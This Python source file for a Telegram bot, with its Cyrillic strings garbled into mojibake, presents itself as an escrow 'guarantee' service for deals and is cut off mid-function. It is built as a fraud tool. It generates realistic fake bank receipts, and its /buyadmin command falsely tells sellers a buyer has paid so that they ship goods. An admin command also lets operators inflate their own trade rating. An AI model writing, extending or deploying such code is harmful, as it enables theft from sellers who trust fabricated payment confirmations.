import telebot
from telebot import types
import random
import string
import time
from datetime import datetime, timedelta
from dotenv import load_dotenv
import os

load_dotenv()  # –∑–∞–≥—Ä—É–∂–∞–µ—Ç –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –∏–∑ .env

load_dotenv()  # –∑–∞–≥—Ä—É–∂–∞–µ—Ç –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –∏–∑ .env

token = os.getenv("BOT_TOKEN")   
print("token", token)

bot = telebot.TeleBot(token)  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à —Ç–æ–∫–µ–Ω

# –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø –ê–î–ú–ò–ù–ò–°–¢–†–ê–¢–û–†–ê
ADMIN_IDS = [6859492950]  # –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –í–ê–® –¢–ï–õ–ï–ì–†–ê–ú ID

# –ë–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö –≤ –ø–∞–º—è—Ç–∏
users_balance = {}
deals_db = {}
user_states = {}
seller_payment_details = {}
fake_payments = {}
user_stats = {}  # –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: user_id -> {"sales": X, "purchases": Y}
user_info = {}  # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è—Ö


def is_admin(user_id):
    return user_id in ADMIN_IDS


def generate_deal_id():
    return ''.join(random.choices(string.digits, k=6))


def generate_payment_id():
    return ''.join(random.choices(string.digits, k=10))


def generate_deal_link(deal_id):
    bot_username = bot.get_me().username
    return f"https://t.me/{bot_username}?start=deal_{deal_id}"


def get_username(user_id):
    try:
        chat = bot.get_chat(user_id)
        return f"@{chat.username}" if chat.username else f"ID: {user_id}"
    except:
        return f"ID: {user_id}"


def get_user_rating(user_id):
    """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ä–µ–π—Ç–∏–Ω–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –≤–∏–¥–µ —Å—Ç—Ä–æ–∫–∏"""
    stats = user_stats.get(user_id, {"sales": 0, "purchases": 0})
    return f"‚òÖ –ü—Ä–æ–¥–∞–∂–∏: {stats['sales']} | –ü–æ–∫—É–ø–∫–∏: {stats['purchases']}"


def update_user_stats(user_id, role):
    """–û–±–Ω–æ–≤–ª—è–µ—Ç —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    if user_id not in user_stats:
        user_stats[user_id] = {"sales": 0, "purchases": 0}

    if role == "seller":
        user_stats[user_id]["sales"] += 1
    elif role == "buyer":
        user_stats[user_id]["purchases"] += 1


def generate_realistic_payment_details(amount, currency):
    payment_time = datetime.now() - timedelta(minutes=random.randint(1, 30))
    payment_id = generate_payment_id()

    banks = {
        "RUB": ["–°–±–µ—Ä–±–∞–Ω–∫", "–¢–∏–Ω—å–∫–æ—Ñ—Ñ", "–í–¢–ë", "–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫", "–ì–∞–∑–ø—Ä–æ–º–±–∞–Ω–∫", "–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω–±–∞–Ω–∫"],
        "KZT": ["Kaspi Bank", "Halyk Bank", "ForteBank", "–¶–µ–Ω—Ç—Ä–ö—Ä–µ–¥–∏—Ç", "–ë–∞–Ω–∫ Home Credit"],
        "UAH": ["–ü—Ä–∏–≤–∞—Ç–ë–∞–Ω–∫", "–ú–æ–Ω–æ–±–∞–Ω–∫", "–û—â–∞–¥–±–∞–Ω–∫", "–£–∫—Ä—Å–∏–±–±–∞–Ω–∫", "–ü–£–ú–ë"]
    }

    bank = random.choice(banks.get(currency, banks["RUB"]))

    return (
        f"üè¶ –ë–∞–Ω–∫: {bank}\n"
        f"üí∞ –°—É–º–º–∞: {amount} {currency}\n"
        f"üÜî –ù–æ–º–µ—Ä –æ–ø–µ—Ä–∞—Ü–∏–∏: {payment_id}\n"
        f"üïí –í—Ä–µ–º—è –æ–ø–ª–∞—Ç—ã: {payment_time.strftime('%d.%m.%Y %H:%M')}\n"
        f"‚úÖ –°—Ç–∞—Ç—É—Å: –£—Å–ø–µ—à–Ω–æ"
    )


@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name
    username = message.from_user.username

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
    user_info[user_id] = {
        "username": username,
        "first_name": first_name
    }

    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
    if user_id not in user_stats:
        user_stats[user_id] = {"sales": 0, "purchases": 0}

    if len(message.text.split()) > 1:
        deal_param = message.text.split()[1]
        if deal_param.startswith('deal_'):
            deal_id = deal_param.split('_')[1]
            if deal_id in deals_db:
                show_deal_info(message, deal_id)
                return

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton('üõí –ê–∫—Ç–∏–≤–Ω—ã–µ —Å–¥–µ–ª–∫–∏')
    btn2 = types.KeyboardButton('‚ûï –°–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É')
    btn3 = types.KeyboardButton('üìä –ú–æ–π –ø—Ä–æ—Ñ–∏–ª—å')
    btn4 = types.KeyboardButton('‚ÑπÔ∏è –ü–æ–º–æ—â—å')
    btn5 = types.KeyboardButton('üí≥ –ú–æ–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã')
    markup.add(btn1, btn2, btn3, btn4, btn5)

    welcome_text = (
        f"üåü –ü—Ä–∏–≤–µ—Ç, {first_name}!\n"
        "–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –≥–∞—Ä–∞–Ω—Ç-—Å–µ—Ä–≤–∏—Å –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö —Å–¥–µ–ª–æ–∫.\n\n"
        "‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n"
        "üíº –í—ã –º–æ–∂–µ—Ç–µ:\n"
        "‚ñ´Ô∏è –°–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É –∫–∞–∫ –ø—Ä–æ–¥–∞–≤–µ—Ü\n"
        "‚ñ´Ô∏è –ü—Ä–∏—Å–æ–µ–¥–∏–Ω–∏—Ç—å—Å—è –∫ —Å–¥–µ–ª–∫—É –∫–∞–∫ –ø–æ–∫—É–ø–∞—Ç–µ–ª—å\n"
        "‚ñ´Ô∏è –£–ø—Ä–∞–≤–ª—è—Ç—å —Å–≤–æ–∏–º –±–∞–ª–∞–Ω—Å–æ–º\n\n"
        "‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n"
        "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ –¥–ª—è –Ω–∞–≤–∏–≥–∞—Ü–∏–∏"
    )

    if user_id not in users_balance:
        users_balance[user_id] = 0

    bot.send_message(
        message.chat.id,
        welcome_text,
        reply_markup=markup
    )


@bot.message_handler(func=lambda message: message.text == 'üí≥ –ú–æ–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã')
def handle_payment_details(message):
    user_id = message.from_user.id

    if user_id in seller_payment_details:
        markup = types.InlineKeyboardMarkup()
        change_btn = types.InlineKeyboardButton(
            text="‚úèÔ∏è –ò–∑–º–µ–Ω–∏—Ç—å —Ä–µ–∫–≤–∏–∑–∏—Ç—ã",
            callback_data="change_payment_details"
        )
        markup.add(change_btn)

        bot.send_message(
            message.chat.id,
            f"üí≥ –í–∞—à–∏ —Ç–µ–∫—É—â–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã:\n\n{seller_payment_details[user_id]}\n\n"
            "–≠—Ç–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–ª–∞—Ç–µ–∂–µ–π –≤ —Å–¥–µ–ª–∫–∞—Ö.",
            reply_markup=markup
        )
    else:
        user_states[user_id] = {"step": "enter_payment_details"}
        bot.send_message(
            message.chat.id,
            "üí≥ –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à–∏ –ø–ª–∞—Ç–µ–∂–Ω—ã–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã:\n\n"
            "–ü—Ä–∏–º–µ—Ä: –°–±–µ—Ä–±–∞–Ω–∫ 2200 7000 8000 5500 –ò–≤–∞–Ω–æ–≤ –ò.–ò."
        )


@bot.message_handler(
    func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'enter_payment_details')
def save_payment_details(message):
    user_id = message.from_user.id
    details = message.text

    if len(details) < 10:
        bot.reply_to(message, "‚ùå –†–µ–∫–≤–∏–∑–∏—Ç—ã —Å–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–µ. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã.")
        return

    seller_payment_details[user_id] = details
    del user_states[user_id]

    bot.reply_to(
        message,
        "‚úÖ –†–µ–∫–≤–∏–∑–∏—Ç—ã —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã!\n\n"
        "–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ —Å–æ–∑–¥–∞–≤–∞—Ç—å —Å–¥–µ–ª–∫–∏."
    )


@bot.callback_query_handler(func=lambda call: call.data == "change_payment_details")
def change_payment_details(call):
    user_id = call.from_user.id
    user_states[user_id] = {"step": "enter_payment_details"}
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="üí≥ –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–µ –ø–ª–∞—Ç–µ–∂–Ω—ã–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã:"
    )


@bot.message_handler(func=lambda message: message.text == '‚ûï –°–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É')
def create_deal_start(message):
    user_id = message.from_user.id

    if user_id not in seller_payment_details:
        bot.send_message(
            message.chat.id,
            "‚ùå –ü—Ä–µ–∂–¥–µ —á–µ–º —Å–æ–∑–¥–∞–≤–∞—Ç—å —Å–¥–µ–ª–∫—É, –≤–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–æ–±–∞–≤–∏—Ç—å –ø–ª–∞—Ç–µ–∂–Ω—ã–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã.\n"
            "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫—É 'üí≥ –ú–æ–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã' –≤ –≥–ª–∞–≤–Ω–æ–º –º–µ–Ω—é."
        )
        return

    user_states[user_id] = {"step": "deal_description"}
    bot.send_message(
        message.chat.id,
        "üìù –í–≤–µ–¥–∏—Ç–µ –æ–ø–∏—Å–∞–Ω–∏–µ —Ç–æ–≤–∞—Ä–∞ –∏–ª–∏ —É—Å–ª—É–≥–∏ –¥–ª—è —Å–¥–µ–ª–∫–∏:\n\n"
        "–ü—Ä–∏–º–µ—Ä: plush pepe"
    )


@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'deal_description')
def handle_deal_description(message):
    user_id = message.from_user.id
    description = message.text

    user_states[user_id] = {
        "step": "deal_amount",
        "description": description
    }

    bot.send_message(
        message.chat.id,
        "üíµ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É —Å–¥–µ–ª–∫–∏ (—Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã):\n\n"
        "–ü—Ä–∏–º–µ—Ä: 15000"
    )


@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'deal_amount')
def handle_deal_amount(message):
    user_id = message.from_user.id

    try:
        amount = float(message.text)
        if amount <= 0:
            raise ValueError

        user_states[user_id]['amount'] = amount

        markup = types.InlineKeyboardMarkup(row_width=3)
        btn_rub = types.InlineKeyboardButton("RUB", callback_data="currency_RUB")
        btn_kzt = types.InlineKeyboardButton("KZT", callback_data="currency_KZT")
        btn_uah = types.InlineKeyboardButton("UAH", callback_data="currency_UAH")
        markup.add(btn_rub, btn_kzt, btn_uah)

        bot.send_message(
            message.chat.id,
            "üí∞ –í—ã–±–µ—Ä–∏—Ç–µ –≤–∞–ª—é—Ç—É –¥–ª—è —Å–¥–µ–ª–∫–∏:",
            reply_markup=markup
        )

    except:
        bot.reply_to(message, "‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —Å—É–º–º–∞. –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –±–æ–ª—å—à–µ –Ω—É–ª—è")


@bot.callback_query_handler(func=lambda call: call.data.startswith('currency_'))
def handle_currency_selection(call):
    user_id = call.from_user.id
    currency = call.data.split('_')[1]

    if user_id not in user_states or 'description' not in user_states[user_id]:
        bot.answer_callback_query(call.id, "‚ùå –°–µ—Å—Å–∏—è —Å–æ–∑–¥–∞–Ω–∏—è —Å–¥–µ–ª–∫–∏ —É—Å—Ç–∞—Ä–µ–ª–∞")
        return

    deal_id = generate_deal_id()
    deals_db[deal_id] = {
        "description": user_states[user_id]['description'],
        "amount": user_states[user_id]['amount'],
        "currency": currency,
        "status": "active",
        "seller_id": user_id,
        "buyer_id": None
    }

    del user_states[user_id]

    deal_link = generate_deal_link(deal_id)
    deal_info = (
        "‚úÖ –°–î–ï–õ–ö–ê –°–û–ó–î–ê–ù–ê!\n\n"
        f"‚ñ´Ô∏è –¢–æ–≤–∞—Ä: {deals_db[deal_id]['description']}\n"
        f"‚ñ´Ô∏è –°—É–º–º–∞: {deals_db[deal_id]['amount']} {currency}\n"
        "‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n"
        "üîó –°—Å—ã–ª–∫–∞ –¥–ª—è –ø–æ–∫—É–ø–∞—Ç–µ–ª—è:\n"
        f"{deal_link}\n\n"
        "–ü–æ–¥–µ–ª–∏—Ç–µ—Å—å —ç—Ç–æ–π —Å—Å—ã–ª–∫–æ–π —Å –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–º"
    )

    bot.send_message(call.message.chat.id, deal_info)
    bot.answer_callback_query(call.id)


def show_deal_info(message, deal_id):
    if deal_id not in deals_db:
        bot.reply_to(message, "‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –∏–ª–∏ —É–∂–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∞")
        return

    deal = deals_db[deal_id]
    user_id = message.from_user.id

    if deal['status'] == 'completed':
        bot.reply_to(message, "‚úÖ –≠—Ç–∞ —Å–¥–µ–ª–∫–∞ —É–∂–µ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞")
        return

    # –ü–æ–ª—É—á–∞–µ–º —Ä–µ–π—Ç–∏–Ω–≥ –ø—Ä–æ–¥–∞–≤—Ü–∞
    seller_rating = get_user_rating(deal['seller_id'])

    if user_id != deal['seller_id']:
        seller_id = deal['seller_id']
        payment_details = seller_payment_details.get(seller_id, "‚ùå –ü—Ä–æ–¥–∞–≤–µ—Ü –Ω–µ —É–∫–∞–∑–∞–ª —Ä–µ–∫–≤–∏–∑–∏—Ç—ã")

        payment_info = (
            f"üõí –°–î–ï–õ–ö–ê #{deal_id}\n\n"
            f"‚ñ´Ô∏è –¢–æ–≤–∞—Ä: {deal['description']}\n"
            f"‚ñ´Ô∏è –°—É–º–º–∞: {deal['amount']} {deal['currency']}\n"
            f"‚ñ´Ô∏è –ü—Ä–æ–¥–∞–≤–µ—Ü: —Å–∫—Ä—ã—Ç –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏\n"
            f"‚ñ´Ô∏è –†–µ–π—Ç–∏–Ω–≥ –ø—Ä–æ–¥–∞–≤—Ü–∞: {seller_rating}\n"
            "‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n"
            f"üí≥ –†–µ–∫–≤–∏–∑–∏—Ç—ã –¥–ª—è –æ–ø–ª–∞—Ç—ã:\n{payment_details}\n\n"
            "‚ö†Ô∏è –ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è"
        )

        markup = types.InlineKeyboardMarkup()
        pay_btn = types.InlineKeyboardButton(
            text="‚úÖ –Ø –æ–ø–ª–∞—Ç–∏–ª",
            callback_data=f"pay_{deal_id}"
        )
        markup.add(pay_btn)

        bot.send_message(
            message.chat.id,
            payment_info,
            reply_markup=markup
        )
    else:
        status_text = "üü¢ –ê–∫—Ç–∏–≤–Ω–∞" if deal['status'] == 'active' else "üü° –û–∂–∏–¥–∞–µ—Ç –ø–æ–ª—É—á–µ–Ω–∏—è"
        deal_info = (
            f"üì¶ –í–ê–®–ê –°–î–ï–õ–ö–ê #{deal_id}\n\n"
            f"‚ñ´Ô∏è –¢–æ–≤–∞—Ä: {deal['description']}\n"
            f"‚ñ´Ô∏è –°—É–º–º–∞: {deal['amount']} {deal['currency']}\n"
            f"‚ñ´Ô∏è –°—Ç–∞—Ç—É—Å: {status_text}\n"
            "‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n"
            "üîó –°—Å—ã–ª–∫–∞ –¥–ª—è –ø–æ–∫—É–ø–∞—Ç–µ–ª—è:\n"
            f"{generate_deal_link(deal_id)}\n\n"
            "–ü–æ–¥–µ–ª–∏—Ç–µ—Å—å —ç—Ç–æ–π —Å—Å—ã–ª–∫–æ–π —Å –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–º"
        )

        bot.send_message(message.chat.id, deal_info)


@bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
def handle_payment_confirmation(call):
    deal_id = call.data.split('_')[1]
    user_id = call.from_user.id

    if deal_id not in deals_db:
        bot.answer_callback_query(call.id, "‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        return

    deal = deals_db[deal_id]

    if deal['status'] != 'active':
        bot.answer_callback_query(call.id, "‚ö†Ô∏è –°–¥–µ–ª–∫–∞ —É–∂–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∞")
        return

    deal['status'] = 'waiting_delivery'
    deal['buyer_id'] = user_id

    payment_details = generate_realistic_payment_details(deal['amount'], deal['currency'])

    seller_id = deal['seller_id']
    try:
        # –ü–æ–ª—É—á–∞–µ–º —Ä–µ–π—Ç–∏–Ω–≥ –ø–æ–∫—É–ø–∞—Ç–µ–ª—è
        buyer_rating = get_user_rating(user_id)

        bot.send_message(
            seller_id,
            f"üí∞ –ü–û–ö–£–ü–ê–¢–ï–õ–¨ –û–ü–õ–ê–¢–ò–õ –°–î–ï–õ–ö–£ #{deal_id}\n\n"
            f"‚ñ´Ô∏è –¢–æ–≤–∞—Ä: {deal['description']}\n"
            f"‚ñ´Ô∏è –°—É–º–º–∞: {deal['amount']} {deal['currency']}\n"
            f"‚ñ´Ô∏è –†–µ–π—Ç–∏–Ω–≥ –ø–æ–∫—É–ø–∞—Ç–µ–ª—è: {buyer_rating}\n\n"
            f"üìù –î–µ—Ç–∞–ª–∏ –ø–ª–∞—Ç–µ–∂–∞:\n{payment_details}\n\n"
            "‚úÖ –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–æ–≤–∞—Ä –ø–æ–∫—É–ø–∞—Ç–µ–ª—é\n\n"
            "‚ÑπÔ∏è –ü–æ–∫—É–ø–∞—Ç–µ–ª—å –ø–æ–ª—É—á–∏—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ–≤–∞—Ä–∞"
        )
    except:
        pass

    markup = types.InlineKeyboardMarkup()
    received_btn = types.InlineKeyboardButton(
        text="üì¶ –Ø –ø–æ–ª—É—á–∏–ª –∑–∞–∫–∞–∑",
        callback_data=f"received_{deal_id}"
    )
    markup.add(received_btn)

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=call.message.text + "\n\n‚úÖ –í—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –æ–ø–ª–∞—Ç—É. –û–∂–∏–¥–∞–π—Ç–µ –¥–æ—Å—Ç–∞–≤–∫—É",
        reply_markup=markup
    )

    bot.answer_callback_query(call.id, "‚úÖ –ü—Ä–æ–¥–∞–≤–µ—Ü —É–≤–µ–¥–æ–º–ª–µ–Ω –æ–± –æ–ø–ª–∞—Ç–µ")


@bot.callback_query_handler(func=lambda call: call.data.startswith('received_'))
def handle_goods_received(call):
    deal_id = call.data.split('_')[1]
    user_id = call.from_user.id

    if deal_id not in deals_db:
        bot.answer_callback_query(call.id, "‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        return

    deal = deals_db[deal_id]

    if deal['status'] != 'waiting_delivery':
        bot.answer_callback_query(call.id, "‚ö†Ô∏è –°—Ç–∞—Ç—É—Å —Å–¥–µ–ª–∫–∏ –∏–∑–º–µ–Ω–∏–ª—Å—è")
        return

    if user_id != deal['buyer_id']:
        bot.answer_callback_query(call.id, "‚ùå –í—ã –Ω–µ –ø–æ–∫—É–ø–∞—Ç–µ–ª—å –≤ —ç—Ç–æ–π —Å–¥–µ–ª–∫–µ")
        return

    deal['status'] = 'completed'

    seller_id = deal['seller_id']
    if seller_id not in users_balance:
        users_balance[seller_id] = 0
    users_balance[seller_id] += deal['amount']

    # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
    update_user_stats(seller_id, "seller")
    update_user_stats(user_id, "buyer")

    try:
        bot.send_message(
            seller_id,
            f"üéâ –ü–û–ö–£–ü–ê–¢–ï–õ–¨ –ü–û–õ–£–ß–ò–õ –¢–û–í–ê–† –ü–û –°–î–ï–õ–ö–ï #{deal_id}\n\n"
            f"‚ñ´Ô∏è –¢–æ–≤–∞—Ä: {deal['description']}\n"
            f"‚ñ´Ô∏è –°—É–º–º–∞: {deal['amount']} {deal['currency']}\n"
            f"‚ñ´Ô∏è –ë–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω: +{deal['amount']} {deal['currency']}\n"
            f"üí≥ –¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: {users_balance[seller_id]} {deal['currency']}\n\n"
            f"‚úÖ –í–∞—à —Ä–µ–π—Ç–∏–Ω–≥ –æ–±–Ω–æ–≤–ª–µ–Ω: {get_user_rating(seller_id)}"
        )
    except:
        pass

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=call.message.text + "\n\n‚úÖ –í—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –ø–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ–≤–∞—Ä–∞. –°–ø–∞—Å–∏–±–æ –∑–∞ —Å–¥–µ–ª–∫—É!",
        reply_markup=None
    )

    seller_username = get_username(deal['seller_id'])
    buyer_username = get_username(deal['buyer_id'])

    admin_message = (
        "üöÄ –£–°–ü–ï–®–ù–û –ó–ê–í–ï–†–®–ï–ù–ê –°–î–ï–õ–ö–ê!\n\n"
        f"‚ñ´Ô∏è ID —Å–¥–µ–ª–∫–∏: #{deal_id}\n"
        f"‚ñ´Ô∏è –¢–æ–≤–∞—Ä: {deal['description']}\n"
        f"‚ñ´Ô∏è –°—É–º–º–∞: {deal['amount']} {deal['currency']}\n"
        f"‚ñ´Ô∏è –ü—Ä–æ–¥–∞–≤–µ—Ü: {seller_username}\n"
        f"‚ñ´Ô∏è –ü–æ–∫—É–ø–∞—Ç–µ–ª—å: {buyer_username}"
    )

    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(admin_id, admin_message)
        except:
            pass

    bot.answer_callback_query(call.id, "‚úÖ –ü—Ä–æ–¥–∞–≤–µ—Ü —É–≤–µ–¥–æ–º–ª–µ–Ω –æ –ø–æ–ª—É—á–µ–Ω–∏–∏")


@bot.message_handler(commands=['buyadmin'])
def handle_buy_admin(message):
    try:
        deal_id = message.text.split()[1]

        if deal_id not in deals_db:
            bot.reply_to(message, "‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
            return

        deal = deals_db[deal_id]

        if deal['status'] != 'active':
            bot.reply_to(message, "‚ö†Ô∏è –°–¥–µ–ª–∫–∞ —É–∂–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ –∏–ª–∏ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ")
            return

        payment_details = generate_realistic_payment_details(deal['amount'], deal['currency'])
        fake_payments[deal_id] = payment_details

        deal['status'] = 'waiting_delivery'
        deal['buyer_id'] = message.from_user.id

        seller_id = deal['seller_id']
        try:
            bot.send_message(
                seller_id,
                f"üí∞ –ü–û–ö–£–ü–ê–¢–ï–õ–¨ –û–ü–õ–ê–¢–ò–õ –°–î–ï–õ–ö–£ #{deal_id}\n\n"
                f"‚ñ´Ô∏è –¢–æ–≤–∞—Ä: {deal['description']}\n"
                f"‚ñ´Ô∏è –°—É–º–º–∞: {deal['amount']} {deal['currency']}\n\n"
                f"üìù –î–µ—Ç–∞–ª–∏ –ø–ª–∞—Ç–µ–∂–∞:\n{payment_details}\n\n"
                "‚úÖ –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–æ–≤–∞—Ä –ø–æ–∫—É–ø–∞—Ç–µ–ª—é\n\n"
                "‚ÑπÔ∏è –ü–æ–∫—É–ø–∞—Ç–µ–ª—å –ø–æ–ª—É—á–∏—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ–≤–∞—Ä–∞"
            )
        except:
            pass

        bot.reply_to(message, f"‚úÖ –û–ø–ª–∞—Ç–∞ –¥–ª—è —Å–¥–µ–ª–∫–∏ #{deal_id} —É—Å–ø–µ—à–Ω–æ —Å—ã–º–∏—Ç–∏—Ä–æ–≤–∞–Ω–∞!\n"
                              f"–ü—Ä–æ–¥–∞–≤–µ—Ü —É–≤–µ–¥–æ–º–ª–µ–Ω –æ –ø–ª–∞—Ç–µ–∂–µ.")

    except IndexError:
        bot.reply_to(message, "‚ùå –£–∫–∞–∂–∏—Ç–µ ID —Å–¥–µ–ª–∫–∏: /buyadmin <deal_id>")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}")


@bot.message_handler(commands=['set_my_stats'])
def set_my_stats(message):
    user_id = message.from_user.id

    if not is_admin(user_id):
        bot.reply_to(message, "‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º")
        return

    try:
        # –§–æ—Ä–º–∞—Ç: /set_my_stats <–ø—Ä–æ–¥–∞–∂–∏> <–ø–æ–∫—É–ø–∫–∏>
        parts = message.text.split()
        if len(parts) < 3:
            raise ValueError

        sales = int(parts[1])
        purchases = int(parts[2])

        if user_id not in user_stats:
            user_stats[user_id] = {"sales": 0, "purchases": 0}

        user_stats[user_id]["sales"] = sales
        user_stats[user_id]["purchases"] = purchases

        bot.reply_to(message, f"‚úÖ –í–∞—à–∞ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∞!\n"
                              f"–ü—Ä–æ–¥–∞–∂–∏: {sales}\n"
                              f"–ü–æ–∫—É–ø–∫–∏: {purchases}\n"
                              f"–†–µ–π—Ç–∏–Ω–≥: {get_user_rating(user_id)}")

    except:
